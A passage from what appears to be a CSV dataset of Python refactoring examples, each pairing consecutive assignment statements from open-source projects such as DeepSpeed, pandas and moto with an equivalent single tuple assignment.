
        Args:
            **never_split**: (`optional`) list of str
                Kept for backward compatibility purposes.
                Now implemented directly at the base class level (see :func:`PreTrainedTokenizer.tokenize`)
                List of token not to split.
        """"""
        never_split = self.never_split + (never_split if never_split is not None else [])
        text = self._clean_text(text)
        # This was added on November 1st, 2018 for the multilingual and Chinese
        # models. This is also applied to the English models now, but it doesn't
        # matter since the English models were not trained on any Chinese data
        # and generally don't have any Chinese data in them (there are Chinese
        # characters in the vocabulary because Wikipedia does have some Chinese
        # words in the English Wikipedia.).
        if self.tokenize_chinese_chars:
            text = self._tokenize_chinese_chars(text)
        orig_tokens = whitespace_tokenize(text)
        split_tokens = []
        for token in orig_tokens:
            if self.do_lower_case and token not in never_split:
                token = token.lower()
                token = self._run_strip_accents(token)
            split_tokens.extend(self._run_split_on_punc(token))

        output_tokens = whitespace_tokenize("" "".join(split_tokens))
        return output_tokens","orig_tokens = whitespace_tokenize(text)
split_tokens = []","orig_tokens , split_tokens  = whitespace_tokenize(text), []"
DeepSpeed,https://github.com/microsoft/DeepSpeed/tree/master/deepspeed/runtime/engine.py,DeepSpeedEngine,step$2018,"def step(self, lr_kwargs=None):
        r""""""Execute the weight update step after forward and backward propagation
        on effective_train_batch.
        """"""
        see_memory_usage(""Engine before step"", force=self.memory_breakdown())

        # Check early because self.global_steps is incremented at some point here.
        # TODO: Delay self.global_steps increment until very end of this function.
        flops_profiler_active = self.flops_profiler_enabled(
        ) and self.global_steps == self.flops_profiler_profile_step(
        ) and self.global_rank == 0

        self._start_timers(self.engine_timers.step_timers)

        assert self.optimizer is not None and not isinstance(self.optimizer, DummyOptim), \
            ""must provide optimizer during init in order to use step""

        report_progress = False

        self._step_applied = False  # assume False, will flip to True

        # Update the model when we reach gradient accumulation boundaries
        if self.is_gradient_accumulation_boundary():
            self.gas_boundary_ctr += 1

            if (self.eigenvalue_enabled() and
                (self.gas_boundary_ctr % self.eigenvalue_gas_boundary_resolution() == 0)
                    and self.quantizer.any_precision_switch()):
                log_dist(f""computing eigenvalue..."", ranks=[0])
                self.block_eigenvalue = self.eigenvalue.compute_eigenvalue(
                    self.module,
                    self.device,
                    self.optimizer.cur_scale)

            if self.progressive_layer_drop:
                self.progressive_layer_drop.update_state(self.global_steps)

            if (self.eigenvalue_enabled() and not self.gas_boundary_ctr %
                    self.eigenvalue_gas_boundary_resolution()
                    and self.quantizer.any_precision_switch()):
                self._take_model_step(lr_kwargs, self.block_eigenvalue)
            else:
                self._take_model_step(lr_kwargs)

            report_progress = self.global_rank == 0 if self.global_rank else True

        self.tput_timer.stop(report_progress)

        self._stop_timers(self.engine_timers.step_timers)

        # Log learning rate
        if self.monitor.enabled:
            if self.is_gradient_accumulation_boundary():
                if self.global_rank == 0:
                    self.summary_events = [(f""Train/Samples/lr"",
                                            self.get_lr()[0],
                                            self.global_samples)]

                    if self.fp16_enabled() and hasattr(self.optimizer, ""cur_scale""):
                        self.summary_events.append((
                            f""Train/Samples/loss_scale"",
                            self.optimizer.cur_scale,
                            self.global_samples,
                        ))

                    if (self.eigenvalue_enabled() and not self.gas_boundary_ctr %
                            self.eigenvalue_gas_boundary_resolution()):
                        ev_values = self.block_eigenvalue.values()
                        for i in range(len(ev_values)):
                            self.summary_events.append((
                                f""Train/Eigenvalues/ModelBlockParam_{i}"",
                                self.ev_values[i][0],
                                self.global_samples,
                            ))
                    self.monitor.write_events(self.summary_events)

        # Check flops profiling
        if flops_profiler_active:
            if self.autotuning_enabled():
                self.flops = self.flops_profiler.get_total_flops() * 3
            else:
                self.flops_profiler.print_model_profile(
                    profile_step=self.global_steps,
                    module_depth=self.flops_profiler_module_depth(),
                    top_modules=self.flops_profiler_top_modules(),
                    detailed=self.flops_profiler_detailed(),
                    output_file=self.flops_profiler_output_file(),
                )
            self.flops_profiler.end_profile()

        if self.autotuning_enabled() and self.global_steps == (
                self.autotuning_end_profile_step() + 1):
            self._autotuning_exit()

        if self.wall_clock_breakdown():
            # Log micro timing and reset
            self.timers.log(names=self.engine_timers.micro_timers,
                            memory_breakdown=self.memory_breakdown())

        if self.wall_clock_breakdown() or self.flops_profiler_enabled():
            # Log global timing and reset
            if self.is_gradient_accumulation_boundary():
                if self.monitor.enabled:
                    self._write_monitor()

                if self.has_moe_layers:
                    fwd_time = self.timers(FORWARD_GLOBAL_TIMER).elapsed(reset=False)
                    self.print_forward_breakdown(fwd_time=fwd_time)

                self.timers.log(self.engine_timers.global_timers)

        self.micro_steps += 1
        see_memory_usage(""Engine after step"", force=self.memory_breakdown())","report_progress = False
self._step_applied = False","report_progress , self._step_applied  = False, False"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/augeas_cfg.py,,match$387,"def match(path, value="""", load_path=None):
    """"""
    Get matches for path expression

    CLI Example:

    .. code-block:: bash

        salt '*' augeas.match /files/etc/services/service-name ssh

    path
        The path to match

    value
        The value to match on

    .. versionadded:: 2016.3.0

    load_path
        A colon-spearated list of directories that modules should be searched
        in. This is in addition to the standard load path and the directories
        in AUGEAS_LENS_LIB.
    """"""
    load_path = _check_load_paths(load_path)

    aug = _Augeas(loadpath=load_path)
    ret = {}

    try:
        matches = aug.match(path)
    except RuntimeError:
        return ret

    for _match in matches:
        if value and aug.get(_match) == value:
            ret[_match] = value
        elif not value:
            ret[_match] = aug.get(_match)
    return ret","aug = _Augeas(loadpath=load_path)
ret = {}","aug , ret  = _Augeas(loadpath=load_path), {}"
Keras-TextClassification,https://github.com/yongzhuo/Keras-TextClassification/tree/master/keras_textclassification/m15_SWEM/predict.py,,pred_input$88,"def pred_input(path_hyper_parameter=path_hyper_parameters):
    """"""
       输入预测
    :param path_hyper_parameter: str, 超参存放地址
    :return: None
    """"""
    # 加载超参数
    hyper_parameters = load_json(path_hyper_parameter)
    pt = PreprocessText(path_model_dir)
    # 模式初始化和加载
    graph = Graph(hyper_parameters)
    graph.load_model()
    ra_ed = graph.word_embedding
    ques = '我要打王者荣耀'
    # str to token
    ques_embed = ra_ed.sentence2idx(ques)
    if hyper_parameters['embedding_type'] in ['bert', 'albert']:
        x_val_1 = np.array([ques_embed[0]])
        x_val_2 = np.array([ques_embed[1]])
        x_val = [x_val_1, x_val_2]
    else:
        x_val = ques_embed
    # 预测
    pred = graph.predict(x_val)
    # 取id to label and pred
    pre = pt.prereocess_idx(pred[0])
    print(pre)
    while True:
        print(""请输入: "")
        ques = input()
        ques_embed = ra_ed.sentence2idx(ques)
        print(ques_embed)
        if hyper_parameters['embedding_type'] in ['bert', 'albert']:
            x_val_1 = np.array([ques_embed[0]])
            x_val_2 = np.array([ques_embed[1]])
            x_val = [x_val_1, x_val_2]
        else:
            x_val = ques_embed
        pred = graph.predict(x_val)
        pre = pt.prereocess_idx(pred[0])
        print(pre)","pt = PreprocessText(path_model_dir)
graph = Graph(hyper_parameters)","pt , graph  = PreprocessText(path_model_dir), Graph(hyper_parameters)"
Keras-TextClassification,https://github.com/yongzhuo/Keras-TextClassification/tree/master/keras_textclassification/m15_SWEM/predict.py,,pred_input$88,"def pred_input(path_hyper_parameter=path_hyper_parameters):
    """"""
       输入预测
    :param path_hyper_parameter: str, 超参存放地址
    :return: None
    """"""
    # 加载超参数
    hyper_parameters = load_json(path_hyper_parameter)
    pt = PreprocessText(path_model_dir)
    # 模式初始化和加载
    graph = Graph(hyper_parameters)
    graph.load_model()
    ra_ed = graph.word_embedding
    ques = '我要打王者荣耀'
    # str to token
    ques_embed = ra_ed.sentence2idx(ques)
    if hyper_parameters['embedding_type'] in ['bert', 'albert']:
        x_val_1 = np.array([ques_embed[0]])
        x_val_2 = np.array([ques_embed[1]])
        x_val = [x_val_1, x_val_2]
    else:
        x_val = ques_embed
    # 预测
    pred = graph.predict(x_val)
    # 取id to label and pred
    pre = pt.prereocess_idx(pred[0])
    print(pre)
    while True:
        print(""请输入: "")
        ques = input()
        ques_embed = ra_ed.sentence2idx(ques)
        print(ques_embed)
        if hyper_parameters['embedding_type'] in ['bert', 'albert']:
            x_val_1 = np.array([ques_embed[0]])
            x_val_2 = np.array([ques_embed[1]])
            x_val = [x_val_1, x_val_2]
        else:
            x_val = ques_embed
        pred = graph.predict(x_val)
        pre = pt.prereocess_idx(pred[0])
        print(pre)","ra_ed = graph.word_embedding
ques = '我要打王者荣耀'","ra_ed , ques  = graph.word_embedding, '我要打王者荣耀'"
Keras-TextClassification,https://github.com/yongzhuo/Keras-TextClassification/tree/master/keras_textclassification/m15_SWEM/predict.py,,pred_input$88,"def pred_input(path_hyper_parameter=path_hyper_parameters):
    """"""
       输入预测
    :param path_hyper_parameter: str, 超参存放地址
    :return: None
    """"""
    # 加载超参数
    hyper_parameters = load_json(path_hyper_parameter)
    pt = PreprocessText(path_model_dir)
    # 模式初始化和加载
    graph = Graph(hyper_parameters)
    graph.load_model()
    ra_ed = graph.word_embedding
    ques = '我要打王者荣耀'
    # str to token
    ques_embed = ra_ed.sentence2idx(ques)
    if hyper_parameters['embedding_type'] in ['bert', 'albert']:
        x_val_1 = np.array([ques_embed[0]])
        x_val_2 = np.array([ques_embed[1]])
        x_val = [x_val_1, x_val_2]
    else:
        x_val = ques_embed
    # 预测
    pred = graph.predict(x_val)
    # 取id to label and pred
    pre = pt.prereocess_idx(pred[0])
    print(pre)
    while True:
        print(""请输入: "")
        ques = input()
        ques_embed = ra_ed.sentence2idx(ques)
        print(ques_embed)
        if hyper_parameters['embedding_type'] in ['bert', 'albert']:
            x_val_1 = np.array([ques_embed[0]])
            x_val_2 = np.array([ques_embed[1]])
            x_val = [x_val_1, x_val_2]
        else:
            x_val = ques_embed
        pred = graph.predict(x_val)
        pre = pt.prereocess_idx(pred[0])
        print(pre)","x_val_1 = np.array([ques_embed[0]])
x_val_2 = np.array([ques_embed[1]])","x_val_1 , x_val_2  = np.array([ques_embed[0]]), np.array([ques_embed[1]])"
Keras-TextClassification,https://github.com/yongzhuo/Keras-TextClassification/tree/master/keras_textclassification/m15_SWEM/predict.py,,pred_input$88,"def pred_input(path_hyper_parameter=path_hyper_parameters):
    """"""
       输入预测
    :param path_hyper_parameter: str, 超参存放地址
    :return: None
    """"""
    # 加载超参数
    hyper_parameters = load_json(path_hyper_parameter)
    pt = PreprocessText(path_model_dir)
    # 模式初始化和加载
    graph = Graph(hyper_parameters)
    graph.load_model()
    ra_ed = graph.word_embedding
    ques = '我要打王者荣耀'
    # str to token
    ques_embed = ra_ed.sentence2idx(ques)
    if hyper_parameters['embedding_type'] in ['bert', 'albert']:
        x_val_1 = np.array([ques_embed[0]])
        x_val_2 = np.array([ques_embed[1]])
        x_val = [x_val_1, x_val_2]
    else:
        x_val = ques_embed
    # 预测
    pred = graph.predict(x_val)
    # 取id to label and pred
    pre = pt.prereocess_idx(pred[0])
    print(pre)
    while True:
        print(""请输入: "")
        ques = input()
        ques_embed = ra_ed.sentence2idx(ques)
        print(ques_embed)
        if hyper_parameters['embedding_type'] in ['bert', 'albert']:
            x_val_1 = np.array([ques_embed[0]])
            x_val_2 = np.array([ques_embed[1]])
            x_val = [x_val_1, x_val_2]
        else:
            x_val = ques_embed
        pred = graph.predict(x_val)
        pre = pt.prereocess_idx(pred[0])
        print(pre)","x_val_1 = np.array([ques_embed[0]])
x_val_2 = np.array([ques_embed[1]])","x_val_1 , x_val_2  = np.array([ques_embed[0]]), np.array([ques_embed[1]])"
saleor,https://github.com/saleor/saleor/tree/master/saleor/graphql/plugins/sorters.py,,sort_plugins$24,"def sort_plugins(plugins: List[""Plugin""], sort_by: Optional[dict]) -> List[""Plugin""]:
    sort_reverse = False
    direction = sort_by.get(""direction"", OrderDirection.ASC) if sort_by else None
    if direction == OrderDirection.DESC:
        sort_reverse = True

    sort_field = (
        sort_by.get(""field"", PluginSortField.NAME) if sort_by else PluginSortField.NAME
    )

    if sort_field == PluginSortField.IS_ACTIVE:
        plugins = sorted(
            plugins,
            key=lambda p: sort_active_key(p, sort_reverse),
        )
    else:
        plugins = sorted(plugins, key=lambda p: p.name, reverse=sort_reverse)
    return plugins","sort_reverse = False
direction = sort_by.get('direction', OrderDirection.ASC) if sort_by else None","sort_reverse , direction  = False, sort_by.get('direction', OrderDirection.ASC) if sort_by else None"
tvm,https://github.com/apache/tvm/tree/master/tests/python/relay/test_pass_alter_op_layout.py,,before$879,"def before():
        x = relay.var(""x"", shape=(1, 32, 56, 56))
        w = relay.var(""w"", shape=(32, 1, 3, 3))
        y = relay.nn.conv2d(x, w, padding=(1, 1), channels=32, kernel_size=(3, 3), groups=32)
        y = relay.Function(analysis.free_vars(y), y)
        return y","x = relay.var('x', shape=(1, 32, 56, 56))
w = relay.var('w', shape=(32, 1, 3, 3))","x , w  = relay.var('x', shape=(1, 32, 56, 56)), relay.var('w', shape=(32, 1, 3, 3))"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.imag.execute().fetch()
expected = a_data.imag","res , expected  = a.imag.execute().fetch(), a_data.imag"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.execute().fetch()
expected = a_data.copy()","res , expected  = a.execute().fetch(), a_data.copy()"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.execute().fetch()
expected = a_data.copy()","res , expected  = a.execute().fetch(), a_data.copy()"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.imag.execute().fetch().toarray()
expected = a_data.imag","res , expected  = a.imag.execute().fetch().toarray(), a_data.imag"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.execute().fetch().toarray()
expected = a_data.copy()","res , expected  = a.execute().fetch().toarray(), a_data.copy()"
mars,https://github.com/mars-project/mars/tree/master/mars/tensor/arithmetic/tests/test_arithmetic_execution.py,,test_set_get_imag_execution$692,"def test_set_get_imag_execution(setup):
    a_data = np.array([1 + 2j, 3 + 4j, 5 + 6j])
    a = tensor(a_data, chunk_size=2)

    res = a.imag.execute().fetch()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)

    # test sparse
    a_data = np.array([[1 + 2j, 3 + 4j, 0], [0, 0, 0]])
    a = tensor(sps.csr_matrix(a_data))

    res = a.imag.execute().fetch().toarray()
    expected = a_data.imag

    np.testing.assert_equal(res, expected)

    a.imag = 9

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = 9

    np.testing.assert_equal(res, expected)

    a.imag = np.array([9, 8, 7])

    res = a.execute().fetch().toarray()
    expected = a_data.copy()
    expected.imag = np.array([9, 8, 7])

    np.testing.assert_equal(res, expected)","res = a.execute().fetch().toarray()
expected = a_data.copy()","res , expected  = a.execute().fetch().toarray(), a_data.copy()"
nibabel,https://github.com/nipy/nibabel/tree/master/nibabel/freesurfer/tests/test_io.py,,test_write_annot_maxstruct$352,"def test_write_annot_maxstruct():
    """"""Test writing ANNOT files with repeated labels""""""
    with InTemporaryDirectory():
        nlabels = 3
        names = [f'label {l}' for l in range(1, nlabels + 1)]
        # max label < n_labels
        labels = np.array([1, 1, 1], dtype=np.int32)
        rgba = np.array(np.random.randint(0, 255, (nlabels, 4)), dtype=np.int32)
        annot_path = 'c.annot'

        write_annot(annot_path, labels, rgba, names)
        # Validate the file can be read
        rt_labels, rt_ctab, rt_names = read_annot(annot_path)
        # Check round-trip
        assert np.array_equal(labels, rt_labels)
        assert np.array_equal(rgba, rt_ctab[:, :4])
        assert names == [n.decode('ascii') for n in rt_names]","names = [f'label {l}' for l in range(1, nlabels + 1)]
labels = np.array([1, 1, 1], dtype=np.int32)
rgba = np.array(np.random.randint(0, 255, (nlabels, 4)), dtype=np.int32)
annot_path = 'c.annot'","names , labels , rgba , annot_path  = [f'label {l}' for l in range(1, nlabels + 1)], np.array([1, 1, 1], dtype=np.int32), np.array(np.random.randint(0, 255, (nlabels, 4)), dtype=np.int32), 'c.annot'"
moto,https://github.com/spulec/moto/tree/master/tests/test_ec2/test_network_acls.py,,test_new_subnet_associates_with_default_network_acl_boto3$77,"def test_new_subnet_associates_with_default_network_acl_boto3():
    if settings.TEST_SERVER_MODE:
        raise SkipTest(""ServerMode will have conflicting CidrBlocks"")
    client = boto3.client(""ec2"", region_name=""us-east-1"")
    ec2 = boto3.resource(""ec2"", region_name=""us-east-1"")
    default_vpc = client.describe_vpcs()[""Vpcs""][0]

    subnet = ec2.create_subnet(VpcId=default_vpc[""VpcId""], CidrBlock=""172.31.112.0/20"")
    all_network_acls = client.describe_network_acls()[""NetworkAcls""]
    all_network_acls.should.have.length_of(1)

    acl = all_network_acls[0]
    acl[""Associations""].should.have.length_of(7)
    [a[""SubnetId""] for a in acl[""Associations""]].should.contain(subnet.id)","ec2 = boto3.resource('ec2', region_name='us-east-1')
default_vpc = client.describe_vpcs()['Vpcs'][0]","ec2 , default_vpc  = boto3.resource('ec2', region_name='us-east-1'), client.describe_vpcs()['Vpcs'][0]"
moto,https://github.com/spulec/moto/tree/master/tests/test_ec2/test_network_acls.py,,test_new_subnet_associates_with_default_network_acl_boto3$77,"def test_new_subnet_associates_with_default_network_acl_boto3():
    if settings.TEST_SERVER_MODE:
        raise SkipTest(""ServerMode will have conflicting CidrBlocks"")
    client = boto3.client(""ec2"", region_name=""us-east-1"")
    ec2 = boto3.resource(""ec2"", region_name=""us-east-1"")
    default_vpc = client.describe_vpcs()[""Vpcs""][0]

    subnet = ec2.create_subnet(VpcId=default_vpc[""VpcId""], CidrBlock=""172.31.112.0/20"")
    all_network_acls = client.describe_network_acls()[""NetworkAcls""]
    all_network_acls.should.have.length_of(1)

    acl = all_network_acls[0]
    acl[""Associations""].should.have.length_of(7)
    [a[""SubnetId""] for a in acl[""Associations""]].should.contain(subnet.id)","subnet = ec2.create_subnet(VpcId=default_vpc['VpcId'], CidrBlock='172.31.112.0/20')
all_network_acls = client.describe_network_acls()['NetworkAcls']","subnet , all_network_acls  = ec2.create_subnet(VpcId=default_vpc['VpcId'], CidrBlock='172.31.112.0/20'), client.describe_network_acls()['NetworkAcls']"
PaddleViT,https://github.com/BR-IDL/PaddleViT/tree/master/image_classification/MobileViT/droppath.py,DropPath,drop_path$28,"def drop_path(self, inputs):
        """"""drop path op
        Args:
            input: tensor with arbitrary shape
            drop_prob: float number of drop path probability, default: 0.0
            training: bool, if current mode is training, default: False
        Returns:
            output: output tensor after drop path
        """"""
        # if prob is 0 or eval mode, return original input
        if self.drop_prob == 0. or not self.training:
            return inputs
        keep_prob = 1 - self.drop_prob
        keep_prob = paddle.to_tensor(keep_prob, dtype='float32')
        shape = (inputs.shape[0], ) + (1, ) * (inputs.ndim - 1)  # shape=(N, 1, 1, 1)
        random_tensor = keep_prob + paddle.rand(shape, dtype=inputs.dtype)
        random_tensor = random_tensor.floor() # mask
        output = inputs.divide(keep_prob) * random_tensor # divide to keep same output expectation
        return output","keep_prob = paddle.to_tensor(keep_prob, dtype='float32')
shape = (inputs.shape[0],) + (1,) * (inputs.ndim - 1)","keep_prob , shape  = paddle.to_tensor(keep_prob, dtype='float32'), (inputs.shape[0],) + (1,) * (inputs.ndim - 1)"
allure-python,https://github.com/allure-framework/allure-python/tree/master/allure-nose2/src/utils.py,,status_details$20,"def status_details(event):
    message, trace = None, None
    if event.exc_info:
        exc_type, value, _ = event.exc_info
        message = '\n'.join(format_exception_only(exc_type, value)) if exc_type or value else None
        trace = ''.join(util.exc_info_to_string(event.exc_info, event.test))
    elif event.reason:
        message = event.reason

    if message or trace:
        return StatusDetails(message=message, trace=trace)","message = '\n'.join(format_exception_only(exc_type, value)) if exc_type or value else None
trace = ''.join(util.exc_info_to_string(event.exc_info, event.test))","message , trace  = '\n'.join(format_exception_only(exc_type, value)) if exc_type or value else None, ''.join(util.exc_info_to_string(event.exc_info, event.test))"
PyFunctional,https://github.com/EntilZha/PyFunctional/tree/master/functional/pipeline.py,Sequence,tabulate$1755,"def tabulate(
        self,
        n=None,
        headers=(),
        tablefmt=""simple"",
        floatfmt=""g"",
        numalign=""decimal"",
        stralign=""left"",
        missingval="""",
    ):
        """"""
        Return pretty string table of first n rows of sequence or everything if n is None. See
        https://bitbucket.org/astanin/python-tabulate for details on tabulate parameters

        :param n: Number of rows to show, if set to None return all rows
        :param headers: Passed to tabulate
        :param tablefmt: Passed to tabulate
        :param floatfmt: Passed to tabulate
        :param numalign: Passed to tabulate
        :param stralign: Passed to tabulate
        :param missingval: Passed to tabulate
        """"""
        self.cache()
        length = self.len()
        if length == 0 or not is_tabulatable(self[0]):
            return None

        if n is None or n >= length:
            rows = self.list()
            message = """"
        else:
            rows = self.take(n).list()
            if tablefmt == ""simple"":
                message = ""\nShowing {} of {} rows"".format(n, length)
            elif tablefmt == ""html"":
                message = ""<p>Showing {} of {} rows"".format(n, length)
            else:
                message = """"
        if len(headers) == 0 and is_namedtuple(rows[0]):
            headers = rows[0]._fields
        return (
            tabulate(
                rows,
                headers=headers,
                tablefmt=tablefmt,
                floatfmt=floatfmt,
                numalign=numalign,
                stralign=stralign,
                missingval=missingval,
            )
            + message
        )","rows = self.list()
message = ''","rows , message  = self.list(), ''"
pygorithm,https://github.com/OmkarPathak/pygorithm/tree/master/pygorithm/geometry/polygon2.py,Polygon2,project_onto_axis$356,"def project_onto_axis(polygon, offset, axis):
        """"""
        Find the projection of the polygon along the axis.
        
        Uses the `dot product <https://en.wikipedia.org/wiki/Dot_product>`
        of each point on the polygon to project those points onto the axis,
        and then finds the extremes of the projection.
        
        :param polygon: the polygon to project
        :type polygon: :class:`pygorithm.geometry.polygon2.Polygon2`
        :param offset: the offset of the polygon
        :type offset: :class:`pygorithm.geometry.vector2.Vector2`
        :param axis: the axis to project onto
        :type axis: :class:`pygorithm.geometry.vector2.Vector2`
        :returns: the projection of the polygon along the axis
        :rtype: :class:`pygorithm.geometry.axisall.AxisAlignedLine`
        """"""
        
        dot_min = None
        dot_max = None
        for pt in polygon.points:
            dot = (pt + offset).dot(axis)
            
            dot_min = min(dot, dot_min) if dot_min is not None else dot
            dot_max = max(dot, dot_max) if dot_max is not None else dot
        
        return axisall.AxisAlignedLine(axis, dot_min, dot_max)","dot_min = None
dot_max = None","dot_min , dot_max  = None, None"
pygorithm,https://github.com/OmkarPathak/pygorithm/tree/master/pygorithm/geometry/polygon2.py,Polygon2,project_onto_axis$356,"def project_onto_axis(polygon, offset, axis):
        """"""
        Find the projection of the polygon along the axis.
        
        Uses the `dot product <https://en.wikipedia.org/wiki/Dot_product>`
        of each point on the polygon to project those points onto the axis,
        and then finds the extremes of the projection.
        
        :param polygon: the polygon to project
        :type polygon: :class:`pygorithm.geometry.polygon2.Polygon2`
        :param offset: the offset of the polygon
        :type offset: :class:`pygorithm.geometry.vector2.Vector2`
        :param axis: the axis to project onto
        :type axis: :class:`pygorithm.geometry.vector2.Vector2`
        :returns: the projection of the polygon along the axis
        :rtype: :class:`pygorithm.geometry.axisall.AxisAlignedLine`
        """"""
        
        dot_min = None
        dot_max = None
        for pt in polygon.points:
            dot = (pt + offset).dot(axis)
            
            dot_min = min(dot, dot_min) if dot_min is not None else dot
            dot_max = max(dot, dot_max) if dot_max is not None else dot
        
        return axisall.AxisAlignedLine(axis, dot_min, dot_max)","dot_min = min(dot, dot_min) if dot_min is not None else dot
dot_max = max(dot, dot_max) if dot_max is not None else dot","dot_min , dot_max  = min(dot, dot_min) if dot_min is not None else dot, max(dot, dot_max) if dot_max is not None else dot"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/reshape/test_pivot.py,TestPivot,test_pivot_empty$2342,"def test_pivot_empty(self):
        df = DataFrame(columns=[""a"", ""b"", ""c""])
        result = df.pivot(index=""a"", columns=""b"", values=""c"")
        expected = DataFrame(index=[], columns=[])
        tm.assert_frame_equal(result, expected, check_names=False)","result = df.pivot(index='a', columns='b', values='c')
expected = DataFrame(index=[], columns=[])","result , expected  = df.pivot(index='a', columns='b', values='c'), DataFrame(index=[], columns=[])"
